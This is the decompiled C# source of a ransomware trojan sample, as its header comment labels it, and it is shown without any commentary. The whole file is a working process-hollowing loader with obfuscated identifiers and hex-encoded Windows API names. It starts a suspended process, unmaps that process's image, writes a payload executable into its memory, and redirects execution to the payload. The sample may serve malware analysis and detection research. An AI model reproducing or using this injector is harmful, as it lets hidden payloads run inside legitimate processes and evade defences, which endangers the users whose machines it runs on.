// Decompiled with JetBrains decompiler
// Type: ZcVVdCANPCbBZjGTONrwNPFhxDuQUIJYETw.tNnBMdKGZiPSgQELMbbwJJkWUVLBJtkqPJMZvVo
// Assembly: kellling, Version=6.7.1.112, Culture=neutral, PublicKeyToken=null
// MVID: 3E8DC2CE-830B-424C-A4AA-D08853C104FF
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00100-msil\Trojan-Ransom.Win32.Blocker.heca-c09fdc2df41dd88ad5aed96231ac18831a58163443ae043a4b0f2290de1257ec.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.IO;
using System.Runtime.InteropServices;

namespace ZcVVdCANPCbBZjGTONrwNPFhxDuQUIJYETw
{
  public sealed class tNnBMdKGZiPSgQELMbbwJJkWUVLBJtkqPJMZvVo : cBNTuwSqYfAGhOOhbRcmPJvbwXAXBaOmiWU
  {
    private const int CONTEXT_X86 = 65536;
    private const int CONTEXT86_INTEGER = 65538;
    private const string KERNEL32HEX = "0x6b65726e656c3332";
    private const long MEM_COMMIT = 4096;
    private const long MEM_RESERVE = 8192;
    private const string NTDLLHEX = "0x6e74646c6c";
    private const long PAGE_EXECUTE = 16;
    private const long PAGE_EXECUTE_READ = 32;
    private const long PAGE_EXECUTE_READWRITE = 64;
    private const long PAGE_NOACCESS = 1;
    private const uint PAGE_READONLY = 2;
    private const long PAGE_READWRITE = 4;

    private long bedot(long characteristics) => Conversions.ToLong(new object[8]
    {
      (object) 1L,
      (object) 16L,
      (object) 2,
      (object) 32L,
      (object) 4L,
      (object) 64L,
      (object) 4L,
      (object) 64L
    }[(int) this.RShift(characteristics, 29L)]);

    public bool gOnTDqnkbWgEKWFhjKpnWFimHpGOQDIfqMhNP(
      byte[] brxEYWdvBgWOPcFNGlAZGjbvGQQoXUeYtIAerPn,
      string MxOmBDtislgHKYPqQCtIDnYfxwQHcWUmtuKESkr)
    {
      long num1 = 0;
      uint num2 = 0;
      IntPtr zero = IntPtr.Zero;
      tNnBMdKGZiPSgQELMbbwJJkWUVLBJtkqPJMZvVo.mAQdIgXjkKTJJupqCcHASFMQDtAhgkUmtAgpOl hasfmqDtAhgkUmtAgpOl = new tNnBMdKGZiPSgQELMbbwJJkWUVLBJtkqPJMZvVo.mAQdIgXjkKTJJupqCcHASFMQDtAhgkUmtAgpOl();
      tNnBMdKGZiPSgQELMbbwJJkWUVLBJtkqPJMZvVo.eekWWKTrgOBYtkUEemvaNgoAAlcLJLAZMJb MXUvqIjkgfjKpdSgogQTHvPEsxVGnvlRdXh = new tNnBMdKGZiPSgQELMbbwJJkWUVLBJtkqPJMZvVo.eekWWKTrgOBYtkUEemvaNgoAAlcLJLAZMJb();
      tNnBMdKGZiPSgQELMbbwJJkWUVLBJtkqPJMZvVo.dhlGfCPQfJZCWuCDRLDtokWggFfVOaMhJAWvwpq wggFfVoaMhJaWvwpq = new tNnBMdKGZiPSgQELMbbwJJkWUVLBJtkqPJMZvVo.dhlGfCPQfJZCWuCDRLDtokWggFfVOaMhJAWvwpq();
      tNnBMdKGZiPSgQELMbbwJJkWUVLBJtkqPJMZvVo.OYTmMakNJsFwGdbrICYXSsxCsqoWVCCaTqcNRfU csqoWvcCaTqcNrfU = new tNnBMdKGZiPSgQELMbbwJJkWUVLBJtkqPJMZvVo.OYTmMakNJsFwGdbrICYXSsxCsqoWVCCaTqcNRfU();
      tNnBMdKGZiPSgQELMbbwJJkWUVLBJtkqPJMZvVo.TSJRSLYbUdkrRQoUWOpUhOnEqddOwLabgPE FqrHtrfeZgfRrVWBBZQeVheKCSFbgIBBCDu = new tNnBMdKGZiPSgQELMbbwJJkWUVLBJtkqPJMZvVo.TSJRSLYbUdkrRQoUWOpUhOnEqddOwLabgPE();
      tNnBMdKGZiPSgQELMbbwJJkWUVLBJtkqPJMZvVo.ggiePKxqNGJAxIpAlAUCdFZngHdJDJLxMojoeI gsAnGWSQEAdrwCDHrvrWJhFbmEtOfeMoZhQEWbV = new tNnBMdKGZiPSgQELMbbwJJkWUVLBJtkqPJMZvVo.ggiePKxqNGJAxIpAlAUCdFZngHdJDJLxMojoeI();
      tNnBMdKGZiPSgQELMbbwJJkWUVLBJtkqPJMZvVo.UPsmhUdPlUXldtxSbEtwIfonBqKjGXBUawA MOGxkJabCpFFHVbxkXwxYBgYmnSMkxjQavHqYG = new tNnBMdKGZiPSgQELMbbwJJkWUVLBJtkqPJMZvVo.UPsmhUdPlUXldtxSbEtwIfonBqKjGXBUawA();
      tNnBMdKGZiPSgQELMbbwJJkWUVLBJtkqPJMZvVo.UPsmhUdPlUXldtxSbEtwIfonBqKjGXBUawA dZSJlWHeBGOPuaTWLggLsmOmDGndKLgZegTYGnq = new tNnBMdKGZiPSgQELMbbwJJkWUVLBJtkqPJMZvVo.UPsmhUdPlUXldtxSbEtwIfonBqKjGXBUawA();
      GCHandle gcHandle = GCHandle.Alloc((object) brxEYWdvBgWOPcFNGlAZGjbvGQQoXUeYtIAerPn, GCHandleType.Pinned);
      int int32 = gcHandle.AddrOfPinnedObject().ToInt32();
      tNnBMdKGZiPSgQELMbbwJJkWUVLBJtkqPJMZvVo.mAQdIgXjkKTJJupqCcHASFMQDtAhgkUmtAgpOl structure1 = (tNnBMdKGZiPSgQELMbbwJJkWUVLBJtkqPJMZvVo.mAQdIgXjkKTJJupqCcHASFMQDtAhgkUmtAgpOl) Marshal.PtrToStructure(gcHandle.AddrOfPinnedObject(), hasfmqDtAhgkUmtAgpOl.GetType());
      gcHandle.Free();
      if (!((tNnBMdKGZiPSgQELMbbwJJkWUVLBJtkqPJMZvVo.CreateProcessA) this.WqDFUVfcQesRZqeRYQPXtLiVxARGQjMAmkDhkX("0x6b65726e656c3332", "0x43726561746550726f6365737341", typeof (tNnBMdKGZiPSgQELMbbwJJkWUVLBJtkqPJMZvVo.CreateProcessA)))((string) null, MxOmBDtislgHKYPqQCtIDnYfxwQHcWUmtuKESkr, ref MOGxkJabCpFFHVbxkXwxYBgYmnSMkxjQavHqYG, ref dZSJlWHeBGOPuaTWLggLsmOmDGndKLgZegTYGnq, false, 4U, zero, (string) null, ref gsAnGWSQEAdrwCDHrvrWJhFbmEtOfeMoZhQEWbV, out FqrHtrfeZgfRrVWBBZQeVheKCSFbgIBBCDu))
        return false;
      tNnBMdKGZiPSgQELMbbwJJkWUVLBJtkqPJMZvVo.dhlGfCPQfJZCWuCDRLDtokWggFfVOaMhJAWvwpq structure2 = (tNnBMdKGZiPSgQELMbbwJJkWUVLBJtkqPJMZvVo.dhlGfCPQfJZCWuCDRLDtokWggFfVOaMhJAWvwpq) Marshal.PtrToStructure(new IntPtr(int32 + structure1.e_lfanew), wggFfVoaMhJaWvwpq.GetType());
      gsAnGWSQEAdrwCDHrvrWJhFbmEtOfeMoZhQEWbV.cb = Strings.Len((object) gsAnGWSQEAdrwCDHrvrWJhFbmEtOfeMoZhQEWbV);
      MXUvqIjkgfjKpdSgogQTHvPEsxVGnvlRdXh.ContextFlags = 65538U;
      if (structure2.Signature != 17744U | structure1.e_magic != (ushort) 23117)
        return false;
      tNnBMdKGZiPSgQELMbbwJJkWUVLBJtkqPJMZvVo.GetThreadContext getThreadContext = (tNnBMdKGZiPSgQELMbbwJJkWUVLBJtkqPJMZvVo.GetThreadContext) this.WqDFUVfcQesRZqeRYQPXtLiVxARGQjMAmkDhkX("0x6b65726e656c3332", "0x476574546872656164436f6e74657874", typeof (tNnBMdKGZiPSgQELMbbwJJkWUVLBJtkqPJMZvVo.GetThreadContext));
      tNnBMdKGZiPSgQELMbbwJJkWUVLBJtkqPJMZvVo.Re re = (tNnBMdKGZiPSgQELMbbwJJkWUVLBJtkqPJMZvVo.Re) this.WqDFUVfcQesRZqeRYQPXtLiVxARGQjMAmkDhkX("0x6b65726e656c3332", "0x5265616450726f636573734d656d6f7279", typeof (tNnBMdKGZiPSgQELMbbwJJkWUVLBJtkqPJMZvVo.Re));
      tNnBMdKGZiPSgQELMbbwJJkWUVLBJtkqPJMZvVo.ZwUnmapViewOfSection unmapViewOfSection = (tNnBMdKGZiPSgQELMbbwJJkWUVLBJtkqPJMZvVo.ZwUnmapViewOfSection) this.WqDFUVfcQesRZqeRYQPXtLiVxARGQjMAmkDhkX("0x6e74646c6c", "0x5a77556e6d6170566965774f6653656374696f6e", typeof (tNnBMdKGZiPSgQELMbbwJJkWUVLBJtkqPJMZvVo.ZwUnmapViewOfSection));
      IntPtr lpbuffer = (IntPtr) num1;
      int gUcdetoVNwtOLiaiapkNNQRSGkMIetoOFNS = 0;
      long num3 = (long) lpbuffer;
      if (!(getThreadContext(FqrHtrfeZgfRrVWBBZQeVheKCSFbgIBBCDu.hThread, ref MXUvqIjkgfjKpdSgogQTHvPEsxVGnvlRdXh) & re(FqrHtrfeZgfRrVWBBZQeVheKCSFbgIBBCDu.hProcess, (int) ((long) MXUvqIjkgfjKpdSgogQTHvPEsxVGnvlRdXh.Ebx + 8L), ref lpbuffer, 4, ref gUcdetoVNwtOLiaiapkNNQRSGkMIetoOFNS) >= 0 & unmapViewOfSection(FqrHtrfeZgfRrVWBBZQeVheKCSFbgIBBCDu.hProcess, (IntPtr) num3) >= 0L))
        return false;
      uint lpBaseAddress = (uint) (int) ((tNnBMdKGZiPSgQELMbbwJJkWUVLBJtkqPJMZvVo.VirtualAllocEx) this.WqDFUVfcQesRZqeRYQPXtLiVxARGQjMAmkDhkX("0x6b65726e656c3332", "0x5669727475616c416c6c6f634578", typeof (tNnBMdKGZiPSgQELMbbwJJkWUVLBJtkqPJMZvVo.VirtualAllocEx)))(FqrHtrfeZgfRrVWBBZQeVheKCSFbgIBBCDu.hProcess, (IntPtr) (long) structure2.OptionalHeader.ImageBase, structure2.OptionalHeader.SizeOfImage, 12288U, 4U);
      if (lpBaseAddress == 0U)
        return false;
      tNnBMdKGZiPSgQELMbbwJJkWUVLBJtkqPJMZvVo.Wr wr1 = (tNnBMdKGZiPSgQELMbbwJJkWUVLBJtkqPJMZvVo.Wr) this.WqDFUVfcQesRZqeRYQPXtLiVxARGQjMAmkDhkX("0x6b65726e656c3332", "0x577269746550726f636573734d656d6f7279", typeof (tNnBMdKGZiPSgQELMbbwJJkWUVLBJtkqPJMZvVo.Wr));
      int lpNumberOfBytesWritten = (int) num2;
      int num4 = wr1(FqrHtrfeZgfRrVWBBZQeVheKCSFbgIBBCDu.hProcess, (IntPtr) (long) lpBaseAddress, brxEYWdvBgWOPcFNGlAZGjbvGQQoXUeYtIAerPn, (int) structure2.OptionalHeader.SizeOfHeaders, out lpNumberOfBytesWritten) ? 1 : 0;
      uint num5 = (uint) lpNumberOfBytesWritten;
      long num6 = (long) (structure1.e_lfanew + 248);
      int num7 = (int) structure2.FileHeader.NumberOfSections - 1;
      for (int index1 = 0; index1 <= num7; ++index1)
      {
        lpbuffer = new IntPtr((long) int32 + num6 + (long) (index1 * 40));
        csqoWvcCaTqcNrfU = (tNnBMdKGZiPSgQELMbbwJJkWUVLBJtkqPJMZvVo.OYTmMakNJsFwGdbrICYXSsxCsqoWVCCaTqcNRfU) Marshal.PtrToStructure(lpbuffer, csqoWvcCaTqcNrfU.GetType());
        byte[] RfUsBItlIdhDqXAWCeXnnfHSYfUjNLDqZpB = new byte[(int) csqoWvcCaTqcNrfU.SizeOfRawData + 1];
        int num8 = (int) ((long) csqoWvcCaTqcNrfU.SizeOfRawData - 1L);
        for (int index2 = 0; index2 <= num8; ++index2)
          RfUsBItlIdhDqXAWCeXnnfHSYfUjNLDqZpB[index2] = brxEYWdvBgWOPcFNGlAZGjbvGQQoXUeYtIAerPn[(int) csqoWvcCaTqcNrfU.PointerToRawData + index2];
        tNnBMdKGZiPSgQELMbbwJJkWUVLBJtkqPJMZvVo.Wr wr2 = (tNnBMdKGZiPSgQELMbbwJJkWUVLBJtkqPJMZvVo.Wr) this.WqDFUVfcQesRZqeRYQPXtLiVxARGQjMAmkDhkX("0x6b65726e656c3332", "0x577269746550726f636573734d656d6f7279", typeof (tNnBMdKGZiPSgQELMbbwJJkWUVLBJtkqPJMZvVo.Wr));
        tNnBMdKGZiPSgQELMbbwJJkWUVLBJtkqPJMZvVo.VirtualProtectEx virtualProtectEx = (tNnBMdKGZiPSgQELMbbwJJkWUVLBJtkqPJMZvVo.VirtualProtectEx) this.WqDFUVfcQesRZqeRYQPXtLiVxARGQjMAmkDhkX("0x6b65726e656c3332", "0x5669727475616c50726f746563744578", typeof (tNnBMdKGZiPSgQELMbbwJJkWUVLBJtkqPJMZvVo.VirtualProtectEx));
        lpNumberOfBytesWritten = (int) num5;
        int num9 = wr2(FqrHtrfeZgfRrVWBBZQeVheKCSFbgIBBCDu.hProcess, (IntPtr) (long) (lpBaseAddress + csqoWvcCaTqcNrfU.VirtualAddress), RfUsBItlIdhDqXAWCeXnnfHSYfUjNLDqZpB, (int) csqoWvcCaTqcNrfU.SizeOfRawData, out lpNumberOfBytesWritten) ? 1 : 0;
        num5 = (uint) lpNumberOfBytesWritten;
        int num10 = virtualProtectEx(FqrHtrfeZgfRrVWBBZQeVheKCSFbgIBBCDu.hProcess, (IntPtr) (long) (lpBaseAddress + csqoWvcCaTqcNrfU.VirtualAddress), (UIntPtr) csqoWvcCaTqcNrfU.Misc.VirtualSize, (UIntPtr) (ulong) this.bedot((long) csqoWvcCaTqcNrfU.Characteristics), (uint) num3);
      }
      byte[] bytes = BitConverter.GetBytes(lpBaseAddress);
      tNnBMdKGZiPSgQELMbbwJJkWUVLBJtkqPJMZvVo.Wr wr3 = (tNnBMdKGZiPSgQELMbbwJJkWUVLBJtkqPJMZvVo.Wr) this.WqDFUVfcQesRZqeRYQPXtLiVxARGQjMAmkDhkX("0x6b65726e656c3332", "0x577269746550726f636573734d656d6f7279", typeof (tNnBMdKGZiPSgQELMbbwJJkWUVLBJtkqPJMZvVo.Wr));
      lpNumberOfBytesWritten = (int) num5;
      int num11 = wr3(FqrHtrfeZgfRrVWBBZQeVheKCSFbgIBBCDu.hProcess, (IntPtr) ((long) MXUvqIjkgfjKpdSgogQTHvPEsxVGnvlRdXh.Ebx + 8L), bytes, 4, out lpNumberOfBytesWritten) ? 1 : 0;
      MXUvqIjkgfjKpdSgogQTHvPEsxVGnvlRdXh.Eax = lpBaseAddress + structure2.OptionalHeader.AddressOfEntryPoint;
      tNnBMdKGZiPSgQELMbbwJJkWUVLBJtkqPJMZvVo.SetThreadContext setThreadContext = (tNnBMdKGZiPSgQELMbbwJJkWUVLBJtkqPJMZvVo.SetThreadContext) this.WqDFUVfcQesRZqeRYQPXtLiVxARGQjMAmkDhkX("0x6b65726e656c3332", "0x536574546872656164436f6e74657874", typeof (tNnBMdKGZiPSgQELMbbwJJkWUVLBJtkqPJMZvVo.SetThreadContext));
      tNnBMdKGZiPSgQELMbbwJJkWUVLBJtkqPJMZvVo.ResumeThread resumeThread = (tNnBMdKGZiPSgQELMbbwJJkWUVLBJtkqPJMZvVo.ResumeThread) this.WqDFUVfcQesRZqeRYQPXtLiVxARGQjMAmkDhkX("0x6b65726e656c3332", "0x526573756d65546872656164", typeof (tNnBMdKGZiPSgQELMbbwJJkWUVLBJtkqPJMZvVo.ResumeThread));
      return setThreadContext(FqrHtrfeZgfRrVWBBZQeVheKCSFbgIBBCDu.hThread, ref MXUvqIjkgfjKpdSgogQTHvPEsxVGnvlRdXh) && resumeThread(FqrHtrfeZgfRrVWBBZQeVheKCSFbgIBBCDu.hThread) > 0U;
    }

    public bool gOnTDqnkbWgEKWFhjKpnWFimHpGOQDIfqMhNP(
      string mAQdIgXjkKTJJupqCcHASFMQDtAhgkUmtAgpOl,
      string eekWWKTrgOBYtkUEemvaNgoAAlcLJLAZMJb)
    {
      bool flag = false;
      return File.Exists(mAQdIgXjkKTJJupqCcHASFMQDtAhgkUmtAgpOl) ? this.gOnTDqnkbWgEKWFhjKpnWFimHpGOQDIfqMhNP(File.ReadAllBytes(mAQdIgXjkKTJJupqCcHASFMQDtAhgkUmtAgpOl), eekWWKTrgOBYtkUEemvaNgoAAlcLJLAZMJb) : flag;
    }

    private long RShift(
      long dhlGfCPQfJZCWuCDRLDtokWggFfVOaMhJAWvwpq,
      long OYTmMakNJsFwGdbrICYXSsxCsqoWVCCaTqcNRfU)
    {
      return (long) Math.Round(this.vbLongToULong(dhlGfCPQfJZCWuCDRLDtokWggFfVOaMhJAWvwpq) / Math.Pow(2.0, (double) OYTmMakNJsFwGdbrICYXSsxCsqoWVCCaTqcNRfU));
    }

    private double vbLongToULong(long TSJRSLYbUdkrRQoUWOpUhOnEqddOwLabgPE) => TSJRSLYbUdkrRQoUWOpUhOnEqddOwLabgPE < 0L ? (double) (TSJRSLYbUdkrRQoUWOpUhOnEqddOwLabgPE + 4294967296L) : (double) TSJRSLYbUdkrRQoUWOpUhOnEqddOwLabgPE;

    private struct eekWWKTrgOBYtkUEemvaNgoAAlcLJLAZMJb
    {
      public uint ContextFlags;
      public uint Dr0;
      public uint Dr1;
      public uint Dr2;
      public uint Dr3;
      public uint Dr6;
      public uint Dr7;
      public tNnBMdKGZiPSgQELMbbwJJkWUVLBJtkqPJMZvVo.FLOATING_SAVE_AREA FloatSave;
      public uint SegGs;
      public uint SegFs;
      public uint SegEs;
      public uint SegDs;
      public uint Edi;
      public uint Esi;
      public uint Ebx;
      public uint Edx;
      public uint Ecx;
      public uint Eax;
      public uint Ebp;
      public uint Eip;
      public uint SegCs;
      public uint EFlags;
      public uint Esp;
      public uint SegSs;
      [MarshalAs(UnmanagedType.ByValArray, SizeConst = 512)]
      public byte[] ExtendedRegisters;
    }

    private delegate bool CreateProcessA(
      string lpApplicationName,
      string lpCommandLine,
      ref tNnBMdKGZiPSgQELMbbwJJkWUVLBJtkqPJMZvVo.UPsmhUdPlUXldtxSbEtwIfonBqKjGXBUawA MOGxkJabCpFFHVbxkXwxYBgYmnSMkxjQavHqYG,
      ref tNnBMdKGZiPSgQELMbbwJJkWUVLBJtkqPJMZvVo.UPsmhUdPlUXldtxSbEtwIfonBqKjGXBUawA dZSJlWHeBGOPuaTWLggLsmOmDGndKLgZegTYGnq,
      bool bInheritHandles,
      uint dwCreationFlags,
      IntPtr lpEnvironment,
      string lpCurrentDirectory,
      [In] ref tNnBMdKGZiPSgQELMbbwJJkWUVLBJtkqPJMZvVo.ggiePKxqNGJAxIpAlAUCdFZngHdJDJLxMojoeI gsAnGWSQEAdrwCDHrvrWJhFbmEtOfeMoZhQEWbV,
      out tNnBMdKGZiPSgQELMbbwJJkWUVLBJtkqPJMZvVo.TSJRSLYbUdkrRQoUWOpUhOnEqddOwLabgPE FqrHtrfeZgfRrVWBBZQeVheKCSFbgIBBCDu);

    private struct FLOATING_SAVE_AREA
    {
      public uint ControlWord;
      public uint StatusWord;
      public uint TagWord;
      public uint ErrorOffset;
      public uint ErrorSelector;
      public uint DataOffset;
      public uint DataSelector;
      [MarshalAs(UnmanagedType.ByValArray, SizeConst = 80)]
      public byte[] RegisterArea;
      public uint Cr0NpxState;
    }

    private delegate bool GetThreadContext(
      IntPtr hThread,
      ref tNnBMdKGZiPSgQELMbbwJJkWUVLBJtkqPJMZvVo.eekWWKTrgOBYtkUEemvaNgoAAlcLJLAZMJb MXUvqIjkgfjKpdSgogQTHvPEsxVGnvlRdXh);

    private struct IMAGE_DATA_DIRECTORY
    {
      public uint VirtualAddress;
      public uint Size;
    }

    private struct mAQdIgXjkKTJJupqCcHASFMQDtAhgkUmtAgpOl
    {
      public ushort e_magic;
      public ushort e_cblp;
      public ushort e_cp;
      public ushort e_crlc;
      public ushort e_cparhdr;
      public ushort e_minalloc;
      public ushort e_maxalloc;
      public ushort e_ss;
      public ushort e_sp;
      public ushort e_csum;
      public ushort e_ip;
      public ushort e_cs;
      public ushort e_lfarlc;
      public ushort e_ovno;
      [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
      public ushort[] e_res1;
      public ushort e_oemid;
      public ushort e_oeminfo;
      [MarshalAs(UnmanagedType.ByValArray, SizeConst = 10)]
      public ushort[] e_res2;
      public int e_lfanew;
    }

    private struct IMAGE_FILE_HEADER
    {
      public ushort Machine;
      public ushort NumberOfSections;
      public uint TimeDateStamp;
      public uint PointerToSymbolTable;
      public uint NumberOfSymbols;
      public ushort SizeOfOptionalHeader;
      public ushort Characteristics;
    }

    private struct dhlGfCPQfJZCWuCDRLDtokWggFfVOaMhJAWvwpq
    {
      public uint Signature;
      public tNnBMdKGZiPSgQELMbbwJJkWUVLBJtkqPJMZvVo.IMAGE_FILE_HEADER FileHeader;
      public tNnBMdKGZiPSgQELMbbwJJkWUVLBJtkqPJMZvVo.IMAGE_OPTIONAL_HEADER32 OptionalHeader;
    }

    private struct IMAGE_OPTIONAL_HEADER32
    {
      public ushort Magic;
      public byte MajorLinkerVersion;
      public byte MinorLinkerVersion;
      public uint SizeOfCode;
      public uint SizeOfInitializedData;
      public uint SizeOfUninitializedData;
      public uint AddressOfEntryPoint;
      public uint BaseOfCode;
      public uint BaseOfData;
      public uint ImageBase;
      public uint SectionAlignment;
      public uint FileAlignment;
      public ushort MajorOperatingSystemVersion;
      public ushort MinorOperatingSystemVersion;
      public ushort MajorImageVersion;
      public ushort MinorImageVersion;
      public ushort MajorSubsystemVersion;
      public ushort MinorSubsystemVersion;
      public uint Win32VersionValue;
      public uint SizeOfImage;
      public uint SizeOfHeaders;
      public uint CheckSum;
      public ushort Subsystem;
      public ushort DllCharacteristics;
      public uint SizeOfStackReserve;
      public uint SizeOfStackCommit;
      public uint SizeOfHeapReserve;
      public uint SizeOfHeapCommit;
      public uint LoaderFlags;
      public uint NumberOfRvaAndSizes;
      [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
      public tNnBMdKGZiPSgQELMbbwJJkWUVLBJtkqPJMZvVo.IMAGE_DATA_DIRECTORY[] DataDirectory;
    }

    private struct OYTmMakNJsFwGdbrICYXSsxCsqoWVCCaTqcNRfU
    {
      public byte Name;
      public tNnBMdKGZiPSgQELMbbwJJkWUVLBJtkqPJMZvVo.Misc Misc;
      public uint VirtualAddress;
      public uint SizeOfRawData;
      public uint PointerToRawData;
      public uint PointerToRelocations;
      public uint PointerToLinenumbers;
      public ushort NumberOfRelocations;
      public ushort NumberOfLinenumbers;
      public uint Characteristics;
    }

    private enum ImageSignatureTypes
    {
      IMAGE_OS2_SIGNATURE_LE = 17740, // 0x0000454C
      IMAGE_VXD_SIGNATURE = 17740, // 0x0000454C
      IMAGE_OS2_SIGNATURE = 17742, // 0x0000454E
      IMAGE_NT_SIGNATURE = 17744, // 0x00004550
      IMAGE_DOS_SIGNATURE = 23117, // 0x00005A4D
    }

    private struct Misc
    {
      public uint PhysicalAddress;
      public uint VirtualSize;
    }

    private struct TSJRSLYbUdkrRQoUWOpUhOnEqddOwLabgPE
    {
      public IntPtr hProcess;
      public IntPtr hThread;
      public int dwProcessId;
      public int dwThreadId;
    }

    private delegate int Re(
      IntPtr hProcess,
      int lpBaseAddress,
      ref IntPtr lpbuffer,
      int size,
      ref int gUcdetoVNwtOLiaiapkNNQRSGkMIetoOFNS);

    private delegate uint ResumeThread(IntPtr hThread);

    private struct UPsmhUdPlUXldtxSbEtwIfonBqKjGXBUawA
    {
      public int nLength;
      public IntPtr lpSecurityDescriptor;
      public int bInheritHandle;
    }

    private delegate bool SetThreadContext(
      IntPtr hThread,
      ref tNnBMdKGZiPSgQELMbbwJJkWUVLBJtkqPJMZvVo.eekWWKTrgOBYtkUEemvaNgoAAlcLJLAZMJb MXUvqIjkgfjKpdSgogQTHvPEsxVGnvlRdXh);

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    private struct ggiePKxqNGJAxIpAlAUCdFZngHdJDJLxMojoeI
    {
      public int cb;
      public string lpReserved;
      public string lpDesktop;
      public string lpTitle;
      public int dwX;
      public int dwY;
      public int dwXSize;
      public int dwYSize;
      public int dwXCountChars;
      public int dwYCountChars;
      public int dwFillAttribute;
      public int dwFlags;
      public short wShowWindow;
      public short cbReserved2;
      public int lpReserved2;
      public int hStdInput;
      public int hStdOutput;
      public int hStdError;
    }

    private delegate IntPtr VirtualAllocEx(
      IntPtr hProcess,
      IntPtr lpAddress,
      uint dwSize,
      uint flAllocationType,
      uint flProtect);

    private delegate int VirtualProtectEx(
      IntPtr hProcess,
      IntPtr lpAddress,
      UIntPtr dwSize,
      UIntPtr flNewProtect,
      [Out] uint lpflOldProtect);

    private delegate bool Wr(
      IntPtr hProcess,
      IntPtr lpBaseAddress,
      byte[] RfUsBItlIdhDqXAWCeXnnfHSYfUjNLDqZpB,
      int iSize,
      out int lpNumberOfBytesWritten);

    private delegate long ZwUnmapViewOfSection(IntPtr hProcess, IntPtr BaseAddress);
  }
}
